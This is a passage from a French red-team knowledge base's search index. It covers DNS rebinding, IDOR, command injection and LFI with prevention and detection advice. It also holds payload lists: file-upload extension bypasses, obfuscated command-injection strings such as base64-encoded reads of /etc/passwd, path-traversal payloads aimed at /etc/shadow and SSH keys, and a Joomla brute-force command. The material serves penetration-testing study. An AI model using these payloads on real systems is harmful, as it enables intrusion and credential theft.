DNS Rebinding","text":"<p>Sc\u00e9nario d'attaque :</p> <ul> <li>L'attaquant enregistre un domaine (par exemple, <code>attacker.com</code>) et configure un serveur DNS malveillant pour r\u00e9pondre aux requ\u00eates de ce domaine.</li> <li>L'utilisateur visite une page web contr\u00f4l\u00e9e par l'attaquant.</li> <li>Le serveur DNS malveillant r\u00e9pond initialement avec une adresse IP contr\u00f4l\u00e9e par l'attaquant.</li> <li>Apr\u00e8s une courte p\u00e9riode, le serveur DNS change l'adresse IP pour une adresse interne du r\u00e9seau local de la victime (par exemple, <code>192.168.0.1</code>).</li> </ul> <p>Exemple de code malveillant :</p> <pre><code>&lt;script&gt; // JavaScript malveillant pour une attaque de DNS Rebinding \nvar img = new Image(); img.src = \"http://attacker.com:8080\"; // Premi\u00e8re requ\u00eate vers l'adresse IP contr\u00f4l\u00e9e par l'attaquant \nsetTimeout(function() { img.src = \"http://192.168.0.1:8080\"; // Requ\u00eate vers l'adresse IP interne \n}, 2000); \n&lt;/script&gt;\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/DNS%20rebinding/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-dns-rebinding","title":"Pr\u00e9vention des Attaques DNS Rebinding","text":"<p>Restrictions au Niveau du Navigateur :</p> <ul> <li>Utiliser des extensions ou des configurations de navigateur pour restreindre l'acc\u00e8s aux adresses IP locales depuis des scripts externes.</li> </ul> <p>Validation des Adresses IP :</p> <ul> <li>Configurer les applications web pour v\u00e9rifier que les requ\u00eates proviennent de noms de domaine ou d'adresses IP attendues.</li> </ul> <pre><code>if ($_SERVER['REMOTE_ADDR'] !== '192.168.0.1') \n{ \n// Requ\u00eate l\u00e9gitime \n} \nelse \n{ \n// Requ\u00eate potentiellement malveillante \n}\n</code></pre> <p>Filtres de Pare-feu :</p> <ul> <li>Utiliser des pare-feux pour filtrer les requ\u00eates HTTP provenant du r\u00e9seau local vers des adresses internes.</li> </ul> <p>Limitation des Dur\u00e9es de Cache DNS :</p> <ul> <li>Configurer de courtes dur\u00e9es de cache (TTL) pour les enregistrements DNS, ce qui r\u00e9duit l'impact des attaques de DNS Rebinding.</li> </ul> <p>Utilisation de DNSSEC :</p> <ul> <li>Mettre en \u0153uvre DNSSEC (DNS Security Extensions) pour garantir l'int\u00e9grit\u00e9 des r\u00e9ponses DNS.</li> </ul>"},{"location":"Red%20Team/Services/HTTP/DNS%20rebinding/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-dns-rebinding","title":"D\u00e9tection des Failles DNS Rebinding","text":"<p>Surveillance des Requ\u00eates DNS :</p> <ul> <li>Surveiller les requ\u00eates DNS pour d\u00e9tecter les mod\u00e8les de requ\u00eates suspectes ou les r\u00e9solutions d'adresses IP internes.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Effectuer des tests manuels en utilisant des scripts de rebinding DNS pour v\u00e9rifier si les applications internes sont accessibles.</li> </ul> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 pour analyser et d\u00e9tecter les vuln\u00e9rabilit\u00e9s de DNS Rebinding, tels que Burp Suite ou des scripts personnalis\u00e9s.</li> </ul> Cat\u00e9gorie Information TTP Exploitation de la politique de m\u00eame origine par la manipulation des enregistrements DNS CWE CWE-346 (Origin Validation Error) Description de l'attaque Le DNS Rebinding exploite la fa\u00e7on dont les navigateurs web appliquent la politique de m\u00eame origine. L'attaque manipule le DNS pour faire croire au navigateur qu'une source fiable lui demande de se connecter \u00e0 un syst\u00e8me malveillant. Impacts potentiels - Contournement des politiques de s\u00e9curit\u00e9 du navigateur- Acc\u00e8s non autoris\u00e9 aux syst\u00e8mes internes- Possibilit\u00e9 d'ex\u00e9cution de code malveillant Comment la d\u00e9tecter - Analyse des journaux DNS pour identifier des changements rapides d'adresse IP- Utilisation de solutions de d\u00e9tection d'intrusion r\u00e9seau- Surveillance des activit\u00e9s suspectes sur le r\u00e9seau Rem\u00e9diations/mitigations - Mise en \u0153uvre de politiques de s\u00e9curit\u00e9 DNS strictes- Configuration des navigateurs et des serveurs pour pr\u00e9venir les abus- Utilisation de pare-feu et de syst\u00e8mes de d\u00e9tection d'intrusion pour filtrer le trafic suspect Lien de r\u00e9f\u00e9rence OWASP - DNS Rebinding"},{"location":"Red%20Team/Services/HTTP/Drupal/Enum%C3%A9ration/","title":"Enum\u00e9ration","text":"<pre><code>droopescan scan drupal -u http://drupal.inlanefreight.local\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/File%20upload/Payloads/","title":"Payloads","text":"<p>Extensions alternatives:</p> <pre><code>PHP: php, php2, php3, php4, php5, php6, php7, phps, pht, phtml, pgif, shtml, phar, inc, hphp, ctp, module\n\nASP: asp, aspx, config, ashx, asmx, aspq, axd, cshtm, cshtml, rem, soap, vbhtm, vbhtml, asa, cer, shtml\n\nJsp: jsp, jspx, jsw, jsv, jspf, wss, dp, action\n\nPerl: pl, cgi\n</code></pre> <p>Bypass check extension:</p> <pre><code>test.png.php\n---\ntest.php%20\ntest.php%0a\ntest.php%00\ntest.php%0d%0a\ntest.php/\ntest.php.\\\ntest.pHp5\n---\ntest.png.pHp5\ntest.php#.png\ntest.php%00.png\ntest.php\\x00.png\ntest.php%0a.png\ntest.php%0d%0a.png\ntest.phpJunk123png\n---\ntest.php.jpg.php\ntest.php%00.png%%00.jpg\netc...\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/IDOR/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/Services/HTTP/IDOR/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Les failles IDOR (Insecure Direct Object Reference) se produisent lorsqu'une application permet un acc\u00e8s direct \u00e0 des objets ou des ressources bas\u00e9es sur une entr\u00e9e fournie par l'utilisateur sans v\u00e9rification suffisante des permissions. Cela permet \u00e0 un attaquant d'acc\u00e9der \u00e0 des donn\u00e9es ou des fonctionnalit\u00e9s auxquelles il ne devrait pas avoir acc\u00e8s en manipulant simplement les r\u00e9f\u00e9rences aux objets dans les requ\u00eates.</p>"},{"location":"Red%20Team/Services/HTTP/IDOR/G%C3%A9n%C3%A9ralit%C3%A9s/#exemple-dattaque-idor","title":"Exemple d'Attaque IDOR","text":"<p>Sc\u00e9nario d'attaque :</p> <ul> <li>Un utilisateur authentifi\u00e9 acc\u00e8de \u00e0 ses propres informations via une URL telle que <code>https://example.com/user/profile?id=123</code>.</li> <li>Un attaquant modifie le param\u00e8tre <code>id</code> pour acc\u00e9der aux informations d'autres utilisateurs, par exemple <code>https://example.com/user/profile?id=124</code>.</li> </ul> <p>Exemple de requ\u00eate malveillante :</p> <pre><code>GET /user/profile?id=124 HTTP/1.1 Host: example.com \nCookie: sessionid=attacker_session_id\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/IDOR/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-idor","title":"Pr\u00e9vention des Attaques IDOR","text":"<p>V\u00e9rification des Permissions :</p> <p>Toujours v\u00e9rifier que l'utilisateur a les permissions n\u00e9cessaires pour acc\u00e9der \u00e0 la ressource demand\u00e9e.</p> <pre><code>session_start(); \n$userId = $_SESSION['user_id']; \n$requestedId = $_GET['id']; // V\u00e9rifier que l'utilisateur a le droit d'acc\u00e9der \u00e0 la ressource \nif ($userId !== $requestedId) { die(\"Acc\u00e8s refus\u00e9.\"); }\n</code></pre> <p>Utilisation de R\u00e9f\u00e9rences Indirectes :</p> <ul> <li>Utiliser des r\u00e9f\u00e9rences indirectes ou des tokens \u00e0 la place des identifiants directs dans les URL et les formulaires.</li> </ul> <pre><code>// G\u00e9n\u00e9rer un token pour chaque utilisateur \n$token = base64_encode(random_bytes(16)); \n$_SESSION['token'] = $token; // Utiliser le token dans les URL \necho \"&lt;a href='profile.php?token=$token'&gt;Mon Profil&lt;/a&gt;\";\n</code></pre> <p>Contr\u00f4le d'Acc\u00e8s au Niveau de l'Application :</p> <ul> <li>Impl\u00e9menter des contr\u00f4les d'acc\u00e8s rigoureux au niveau de l'application pour toutes les op\u00e9rations sensibles.</li> </ul> <pre><code>// Exemple avec un framework MVC \nclass UserController extends Controller \n{ public function profile($id) { \n$user = User::find($id); \nif ($user-&gt;id !== Auth::user()-&gt;id) { \nabort(403, 'Acc\u00e8s refus\u00e9'); \n} \nreturn view('profile', compact('user')); } }\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/IDOR/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-idor","title":"D\u00e9tection des Failles IDOR","text":"<p>Revue de Code :</p> <ul> <li>Examiner le code source pour identifier les r\u00e9f\u00e9rences directes aux objets et v\u00e9rifier la pr\u00e9sence de contr\u00f4les d'acc\u00e8s appropri\u00e9s.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Effectuer des tests manuels en modifiant les param\u00e8tres des requ\u00eates pour v\u00e9rifier si des donn\u00e9es non autoris\u00e9es peuvent \u00eatre acc\u00e9d\u00e9es.</li> </ul> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 tels que Burp Suite, OWASP ZAP, ou des scanners sp\u00e9cifiques pour d\u00e9tecter les failles IDOR.</li> </ul>"},{"location":"Red%20Team/Services/HTTP/IDOR/G%C3%A9n%C3%A9ralit%C3%A9s/#exemples-de-references-indirectes-securisees","title":"Exemples de R\u00e9f\u00e9rences Indirectes S\u00e9curis\u00e9es","text":"<p>Utilisation de UUID :</p> <ul> <li>Utiliser des identifiants universels uniques (UUID) au lieu d'identifiants s\u00e9quentiels.</li> </ul> <pre><code>// G\u00e9n\u00e9rer un UUID pour l'utilisateur \n$uuid = bin2hex(random_bytes(16)); // Associer l'UUID \u00e0 l'utilisateur dans la base de donn\u00e9es\n</code></pre> <p>Mapping des R\u00e9f\u00e9rences :</p> <ul> <li>Utiliser une table de mapping pour g\u00e9rer les r\u00e9f\u00e9rences entre les identifiants publics et priv\u00e9s.</li> </ul> <pre><code>// Table de mapping des tokens et des ID utilisateur \n$token = $_GET['token']; \n$userId = getUserIdFromToken($token); \n\nfunction getUserIdFromToken($token) { \n// Rechercher l'ID utilisateur correspondant au token dans la base de donn\u00e9es \n$stmt = $pdo-&gt;prepare(\"SELECT user_id FROM tokens WHERE token = ?\"); \n$stmt-&gt;execute([$token]); \nreturn $stmt-&gt;fetchColumn(); }\n</code></pre> Cat\u00e9gorie Information TTP R\u00e9f\u00e9rence directe \u00e0 un objet non s\u00e9curis\u00e9 CWE CWE-639 (Authorization Bypass Through User-Controlled Key) Description de l'attaque IDOR se produit lorsqu'une application fournit un acc\u00e8s direct \u00e0 des objets en se basant sur des entr\u00e9es fournies par l'utilisateur, sans v\u00e9rification suffisante de l'autorisation. Cela peut permettre \u00e0 un attaquant d'acc\u00e9der \u00e0 des donn\u00e9es auxquelles il ne devrait normalement pas avoir acc\u00e8s. Impacts potentiels - Acc\u00e8s non autoris\u00e9 \u00e0 des donn\u00e9es sensibles- Modification ou suppression de donn\u00e9es- Violation de la confidentialit\u00e9 des donn\u00e9es Comment la d\u00e9tecter - Tests de p\u00e9n\u00e9tration manuels- Analyse des journaux d'acc\u00e8s pour des acc\u00e8s anormaux- Utilisation de scanners automatiques de vuln\u00e9rabilit\u00e9 Rem\u00e9diations/mitigations - Mise en \u0153uvre d'une v\u00e9rification syst\u00e9matique des autorisations pour chaque acc\u00e8s aux donn\u00e9es- Utilisation de tokens de session et de contr\u00f4les d'acc\u00e8s bas\u00e9s sur les r\u00f4les- Sensibilisation des d\u00e9veloppeurs \u00e0 cette vuln\u00e9rabilit\u00e9 lors de la conception de l'application Lien de r\u00e9f\u00e9rence OWASP - Insecure Direct Object References"},{"location":"Red%20Team/Services/HTTP/Injection%20de%20commande/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/Services/HTTP/Injection%20de%20commande/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Les failles d'injection de commandes se produisent lorsque des applications acceptent des entr\u00e9es non s\u00e9curis\u00e9es et les transmettent \u00e0 un interpr\u00e9teur de commandes (shell) pour ex\u00e9cution. Cela permet \u00e0 un attaquant d'ex\u00e9cuter des commandes arbitraires sur le syst\u00e8me h\u00f4te avec les privil\u00e8ges de l'application vuln\u00e9rable, conduisant \u00e0 la compromission du syst\u00e8me, \u00e0 la divulgation de donn\u00e9es sensibles, ou \u00e0 des dommages importants.</p>"},{"location":"Red%20Team/Services/HTTP/Injection%20de%20commande/G%C3%A9n%C3%A9ralit%C3%A9s/#exemple-dattaque-par-injection-de-commandes","title":"Exemple d'Attaque par Injection de Commandes","text":"<p>Sc\u00e9nario d'attaque :</p> <ul> <li>Une application web prend une entr\u00e9e utilisateur et l'utilise directement dans une commande syst\u00e8me sans validation ou \u00e9chappement ad\u00e9quat.</li> </ul> <p>*Exemple de code vuln\u00e9rable :</p> <pre><code>&lt;?php $domain = $_GET['domain']; \necho shell_exec(\"nslookup \" . $domain); \n?&gt;\n</code></pre> <p>Exploitation :</p> <ul> <li>Un attaquant peut injecter des commandes suppl\u00e9mentaires via l'entr\u00e9e utilisateur, par exemple <code>domain=example.com; cat /etc/passwd</code>.</li> </ul> <pre><code>GET /nslookup.php?domain=example.com;cat+/etc/passwd HTTP/1.1 \nHost: example.com\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Injection%20de%20commande/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-dinjection-de-commandes","title":"Pr\u00e9vention des Attaques d'Injection de Commandes","text":"<p>Validation des Entr\u00e9es :</p> <ul> <li>Valider et assainir toutes les entr\u00e9es utilisateur pour ne permettre que des caract\u00e8res et des formats attendus.</li> </ul> <pre><code>$domain = filter_var($_GET['domain'], FILTER_VALIDATE_DOMAIN); \nif ($domain === false) { \ndie(\"Nom de domaine non valide.\"); \n}\n</code></pre> <p>Utilisation de Fonctions Syst\u00e8me S\u00e9curis\u00e9es :</p> <ul> <li>Utiliser des API ou des fonctions de biblioth\u00e8ques qui n'interagissent pas directement avec le shell syst\u00e8me.</li> </ul> <pre><code>$output = dns_get_record($domain, DNS_A);\n</code></pre> <p>Echappement des Entr\u00e9es :</p> <ul> <li>\u00c9chapper les caract\u00e8res sp\u00e9ciaux dans les entr\u00e9es utilisateur avant de les utiliser dans des commandes syst\u00e8me.</li> </ul> <pre><code>$domain = escapeshellarg($_GET['domain']); \necho shell_exec(\"nslookup \" . $domain);\n</code></pre> <p>Principle of Least Privilege :</p> <ul> <li>Ex\u00e9cuter les commandes avec des privil\u00e8ges minimaux n\u00e9cessaires pour r\u00e9duire l'impact des injections potentielles.</li> </ul>"},{"location":"Red%20Team/Services/HTTP/Injection%20de%20commande/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-dinjection-de-commandes","title":"D\u00e9tection des Failles d'Injection de Commandes","text":"<p>Revue de Code :</p> <p>Analyser le code source pour identifier les endroits o\u00f9 des entr\u00e9es utilisateur sont utilis\u00e9es dans des commandes syst\u00e8me.</p> <p>Tests Manuels :</p> <p>Tester manuellement en essayant d'injecter des commandes dans les param\u00e8tres des requ\u00eates pour identifier les vuln\u00e9rabilit\u00e9s.</p> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <p>Utiliser des outils d'analyse statique et dynamique pour d\u00e9tecter les injections de commandes, tels que Burp Suite, OWASP ZAP, ou des scanners sp\u00e9cifiques \u00e0 l'injection de commandes.</p>"},{"location":"Red%20Team/Services/HTTP/Injection%20de%20commande/G%C3%A9n%C3%A9ralit%C3%A9s/#exemples-de-prevention","title":"Exemples de Pr\u00e9vention","text":"<p>Validation stricte des Entr\u00e9es :</p> <pre><code>if (preg_match('/^[a-zA-Z0-9.-]+$/', $_GET['domain'])) { \n$domain = $_GET['domain']; \n} else { \ndie(\"Nom de domaine non valide.\"); \n}\n</code></pre> <p>Utilisation de Biblioth\u00e8ques S\u00e9curis\u00e9es :</p> <pre><code>use Symfony\\Component\\Process\\Process; \nuse Symfony\\Component\\Process\\Exception\\ProcessFailedException; \n\n$process = new Process(['nslookup', $domain]); \n$process-&gt;run(); \n\nif (!$process-&gt;isSuccessful()) { \nthrow new ProcessFailedException($process); \n} \n\necho $process-&gt;getOutput();\n</code></pre> <p>Echappement Appropri\u00e9 :</p> <pre><code>$domain = escapeshellarg($_GET['domain']); \n$output = shell_exec(\"nslookup \" . $domain); \necho htmlspecialchars($output, ENT_QUOTES, 'UTF-8');\n</code></pre> Cat\u00e9gorie Information TTP Injection de commandes syst\u00e8me ou de shell dans une application CWE CWE-77 (Command Injection) Description de l'attaque L'injection de commandes se produit lorsqu'un attaquant ins\u00e8re ou injecte une commande dans une application, qui est ensuite ex\u00e9cut\u00e9e par le syst\u00e8me d'exploitation. Cela peut permettre l'ex\u00e9cution de commandes arbitraires sur le serveur. Impacts potentiels - Ex\u00e9cution de commandes arbitraires- Compromission du serveur- Acc\u00e8s non autoris\u00e9 aux syst\u00e8mes et donn\u00e9es Comment la d\u00e9tecter - Analyse des journaux d'applications pour des commandes suspectes- Utilisation de scanners de vuln\u00e9rabilit\u00e9s- Tests de p\u00e9n\u00e9tration ciblant l'ex\u00e9cution de commandes Rem\u00e9diations/mitigations - Validation et \u00e9chappement des entr\u00e9es utilisateur- Utilisation de listes blanches pour les commandes autoris\u00e9es- Ex\u00e9cution des processus avec des privil\u00e8ges limit\u00e9s- Formation des d\u00e9veloppeurs aux pratiques de codage s\u00e9curis\u00e9 Lien de r\u00e9f\u00e9rence OWASP - Command Injection"},{"location":"Red%20Team/Services/HTTP/Injection%20de%20commande/Payloads/","title":"Payloads","text":"<pre><code>ping 127.0.0.1; whoami\nping -c 1 127.0.0.1 &amp;&amp; whoami\nping -c 1 127.0.0.1 || whoami\n127.0.0.1%0a whoami\n127.0.0.1%0a{ls,-la}\nw\"h\"o\"am\"i\nwho$@ami\nw\\ho\\am\\i\nwho^ami\nWhOaMi\n$(tr \"[A-Z]\" \"[a-z]\"&lt;&lt;&lt;\"WhOaMi\")\n$(rev&lt;&lt;&lt;'imaohw')\nbash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)\n</code></pre> <p>https://github.com/Bashfuscator/Bashfuscator</p>"},{"location":"Red%20Team/Services/HTTP/Injection%20de%20commande/Payloads/#injection-operators","title":"Injection Operators","text":"Injection Operator Injection Character URL-Encoded Character Executed Command Semicolon <code>;</code> <code>%3b</code> Both New Line <code>\\n</code> <code>%0a</code> Both Background <code>&amp;</code> <code>%26</code> Both (second output generally shown first) Pipe <code>\\|</code> <code>%7c</code> Both (only second output is shown) AND <code>&amp;&amp;</code> <code>%26%26</code> Both (only if first succeeds) OR <code>\\|\\|</code> <code>%7c%7c</code> Second (only if first fails) Sub-Shell <code>``</code> <code>%60%60</code> Both (Linux-only) Sub-Shell <code>$()</code> <code>%24%28%29</code> Both (Linux-only)"},{"location":"Red%20Team/Services/HTTP/Injection%20de%20commande/Payloads/#linux","title":"Linux","text":""},{"location":"Red%20Team/Services/HTTP/Injection%20de%20commande/Payloads/#filtered-character-bypass","title":"Filtered Character Bypass","text":"Code Description <code>printenv</code> Can be used to view all environment variables Spaces <code>%09</code> Using tabs instead of spaces <code>${IFS}</code> Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. <code>$()</code>) <code>{ls,-la}</code> Commas will be replaced with spaces Other Characters <code>${PATH:0:1}</code> Will be replaced with <code>/</code> <code>${LS_COLORS:10:1}</code> Will be replaced with <code>;</code> <code>$(tr '!-}' '\"-~'&lt;&lt;&lt;[)</code> Shift character by one (<code>[</code> -&gt; <code>\\</code>)"},{"location":"Red%20Team/Services/HTTP/Injection%20de%20commande/Payloads/#blacklisted-command-bypass","title":"Blacklisted Command Bypass","text":"Code Description Character Insertion <code>'</code> or <code>\"</code> Total must be even <code>$@</code> or <code>\\</code> Linux only Case Manipulation <code>$(tr \"[A-Z]\" \"[a-z]\"&lt;&lt;&lt;\"WhOaMi\")</code> Execute command regardless of cases <code>$(a=\"WhOaMi\";printf %s \"${a,,}\")</code> Another variation of the technique Reversed Commands <code>echo 'whoami' \\| rev</code> Reverse a string <code>$(rev&lt;&lt;&lt;'imaohw')</code> Execute reversed command Encoded Commands <code>echo -n 'cat /etc/passwd \\| grep 33' \\| base64</code> Encode a string with base64 <code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code> Execute b64 encoded string"},{"location":"Red%20Team/Services/HTTP/Injection%20de%20commande/Payloads/#windows","title":"Windows","text":""},{"location":"Red%20Team/Services/HTTP/Injection%20de%20commande/Payloads/#filtered-character-bypass_1","title":"Filtered Character Bypass","text":"Code Description <code>Get-ChildItem Env:</code> Can be used to view all environment variables - (PowerShell) Spaces <code>%09</code> Using tabs instead of spaces <code>%PROGRAMFILES:~10,-5%</code> Will be replaced with a space - (CMD) <code>$env:PROGRAMFILES[10]</code> Will be replaced with a space - (PowerShell) Other Characters <code>%HOMEPATH:~0,-17%</code> Will be replaced with <code>\\</code> - (CMD) <code>$env:HOMEPATH[0]</code> Will be replaced with <code>\\</code> - (PowerShell)"},{"location":"Red%20Team/Services/HTTP/Injection%20de%20commande/Payloads/#blacklisted-command-bypass_1","title":"Blacklisted Command Bypass","text":"Code Description Character Insertion <code>'</code> or <code>\"</code> Total must be even <code>^</code> Windows only (CMD) Case Manipulation <code>WhoAmi</code> Simply send the character with odd cases Reversed Commands <code>\"whoami\"[-1..-20] -join ''</code> Reverse a string <code>iex \"$('imaohw'[-1..-20] -join '')\"</code> Execute reversed command Encoded Commands <code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))</code> Encode a string with base64 <code>iex \"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))\"</code> Execute b64 encoded string"},{"location":"Red%20Team/Services/HTTP/Joomla/Bruteforce%20panel%20administration/","title":"Bruteforce panel administration","text":"<pre><code>python3 joomla-brute.py -u http://$url -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/Joomla/Enum%C3%A9ration/","title":"Enum\u00e9ration","text":"<p>Enum\u00e9ration:</p> <pre><code>sudo pip3 install droopescan\n</code></pre> <pre><code>droopescan scan joomla --url http://dev.inlanefreight.local/\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/LFI/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/Services/HTTP/LFI/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Les failles d'inclusion de fichiers locaux (LFI) se produisent lorsqu'une application web inclut des fichiers locaux sans validation ad\u00e9quate des entr\u00e9es utilisateur. Cela permet \u00e0 un attaquant d'inclure des fichiers arbitraires du serveur dans l'application, pouvant entra\u00eener la divulgation de fichiers sensibles, l'ex\u00e9cution de code malveillant, et d'autres cons\u00e9quences graves.</p>"},{"location":"Red%20Team/Services/HTTP/LFI/G%C3%A9n%C3%A9ralit%C3%A9s/#exemple-dattaque-lfi","title":"Exemple d'Attaque LFI","text":"<p>Sc\u00e9nario d'attaque :</p> <ul> <li>Une application web inclut dynamiquement un fichier en fonction des param\u00e8tres fournis par l'utilisateur via une URL, par exemple <code>https://example.com/index.php?page=home</code>.</li> </ul> <p>Exemple de code vuln\u00e9rable :</p> <pre><code>&lt;?php \n$page = $_GET['page']; \ninclude($page . \".php\"); \n?&gt;\n</code></pre> <p>Exploitation :</p> <ul> <li>Un attaquant peut manipuler le param\u00e8tre <code>page</code> pour inclure des fichiers sensibles ou des fichiers de configuration, par exemple <code>https://example.com/index.php?page=../../../../etc/passwd</code>.</li> </ul> <pre><code>GET /index.php?page=../../../../etc/passwd HTTP/1.1 \nHost: example.com\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/LFI/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-lfi","title":"Pr\u00e9vention des Attaques LFI","text":"<p>Validation et Sanitation des Entr\u00e9es :</p> <ul> <li>Valider et assainir toutes les entr\u00e9es utilisateur pour s'assurer qu'elles ne contiennent pas de caract\u00e8res sp\u00e9ciaux ou de chemins relatifs.</li> </ul> <pre><code>$whitelist = ['home', 'about', 'contact']; \n$page = $_GET['page']; \nif (!in_array($page, $whitelist)) { \ndie(\"Page non autoris\u00e9e.\"); \n} \ninclude($page . \".php\");\n</code></pre> <p>Utilisation de Chemins Absolus :</p> <ul> <li>Utiliser des chemins absolus pour les fichiers inclus afin d'emp\u00eacher les manipulations de chemins relatifs.</li> </ul> <pre><code>$page = basename($_GET['page']); \ninclude(\"/var/www/html/pages/\" . $page . \".php\");\n</code></pre> <p>Configuration du Serveur :</p> <ul> <li>Configurer le serveur pour restreindre l'acc\u00e8s aux fichiers critiques et sensibles.</li> </ul> <pre><code># Exemple de configuration Apache \n&lt;Directory /var/www/html&gt; \nOptions -Indexes \nAllowOverride None \n&lt;/Directory&gt;\n</code></pre>"},{"location":"Red%20Team/Services/HTTP/LFI/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-lfi","title":"D\u00e9tection des Failles LFI","text":"<p>Revue de Code :</p> <ul> <li>Examiner le code source pour identifier les inclusions de fichiers bas\u00e9es sur des entr\u00e9es utilisateur sans validation ad\u00e9quate.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Effectuer des tests manuels en manipulant les param\u00e8tres de requ\u00eates pour inclure des fichiers arbitraires et v\u00e9rifier la pr\u00e9sence de vuln\u00e9rabilit\u00e9s.</li> </ul> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 tels que Burp Suite, OWASP ZAP, ou des scanners sp\u00e9cifiques pour d\u00e9tecter les failles LFI.</li> </ul>"},{"location":"Red%20Team/Services/HTTP/LFI/G%C3%A9n%C3%A9ralit%C3%A9s/#exemples-de-prevention","title":"Exemples de Pr\u00e9vention","text":"<p>Validation stricte des Entr\u00e9es :</p> <pre><code>$allowed_pages = ['home', 'about', 'contact']; \n$page = $_GET['page']; \nif (!in_array($page, $allowed_pages)) { \ndie(\"Page non autoris\u00e9e.\"); \n} \ninclude($page . \".php\");\n</code></pre> <p>Utilisation de Fonctions S\u00e9curis\u00e9es :</p> <pre><code>$page = filter_input(INPUT_GET, 'page', FILTER_SANITIZE_STRING); \n$allowed_pages = ['home', 'about', 'contact']; \nif (!in_array($page, $allowed_pages)) { \ndie(\"Page non autoris\u00e9e.\"); \n} \ninclude(__DIR__ . \"/pages/\" . $page . \".php\");\n</code></pre> <p>Contr\u00f4le des Chemins :</p> <pre><code>$page = realpath(__DIR__ . \"/pages/\" . $_GET['page'] . \".php\"); \n$base_dir = realpath(__DIR__ . \"/pages/\"); \nif (strpos($page, $base_dir) !== 0 || !file_exists($page)) { \ndie(\"Page non autoris\u00e9e.\"); \n} \ninclude($page);\n</code></pre> Cat\u00e9gorie Information TTP Technique d'injection de fichier local CWE CWE-98 (Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')) Description de l'attaque LFI permet \u00e0 un attaquant d'inclure des fichiers sur un serveur via le navigateur web. Cela se produit souvent lorsque les pages utilisent une entr\u00e9e non valid\u00e9e pour charger des fichiers dynamiquement. Impacts potentiels - Divulgation d'informations sensibles- Ex\u00e9cution de code \u00e0 distance- Compromission du serveur web Comment la d\u00e9tecter - Analyse des journaux de serveur web pour les chemins de fichiers suspects- Utilisation de scanners de vuln\u00e9rabilit\u00e9s- Audits de code pour les inclusions de fichiers non s\u00e9curis\u00e9es Rem\u00e9diations/mitigations - Validation stricte des entr\u00e9es utilisateur- Utilisation de la liste blanche pour les chemins de fichiers- Mise \u00e0 jour et s\u00e9curisation des scripts PHP- D\u00e9sactivation de la directive <code>allow_url_include</code> dans PHP Lien de r\u00e9f\u00e9rence OWASP - Local File Inclusion"},{"location":"Red%20Team/Services/HTTP/LFI/Payloads/","title":"Payloads","text":""},{"location":"Red%20Team/Services/HTTP/LFI/Payloads/#techniques-de-base","title":"Techniques de base:","text":"<p><code>=/etc/passwd</code></p> <p><code>=../../../../../../etc/passwd</code></p> <p><code>=....//....//....//....//....//....//....//etc/passwd</code></p> <p><code>=....////....////....////....////....////etc/passwd</code></p> <p><code>=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd (url encode)</code></p> <p><code>=/gallery/../../../../../../../etc/passwd (en cas d'obligation de la pr\u00e9sence d'un chemin approuv\u00e9 dans l'url)</code></p> <p><code>=../../../../etc/passwd%00 (null byte)</code></p>"},{"location":"Red%20Team/Services/HTTP/LFI/Payloads/#php-filters","title":"PHP filters:","text":"<pre><code>php://filter/read=convert.base64-encode/resource=../../../etc/passwd\n</code></pre> <p>Fichiers int\u00e9ressants \u00e0 lire :</p> <pre><code>/etc/passwd\n/proc/$PID/cmdline (g\u00e9n\u00e9rer une wordlist avec des chiffres de 1 \u00e0 1000)\n/etc/shadow\n/home/$user/.ssh/id_rsa\n/var/www/html/fichierdeconfig.php\n/var/www/html/LesDiff\u00e9rentesPages // permet de voir le code source \u00e9ventuellement)\n</code></pre> Function Read Content Execute Remote URL PHP <code>include()</code>/<code>include_once()</code> \u2705 \u2705 \u2705 <code>require()</code>/<code>require_once()</code> \u2705 \u2705 \u274c <code>file_get_contents()</code> \u2705 \u274c 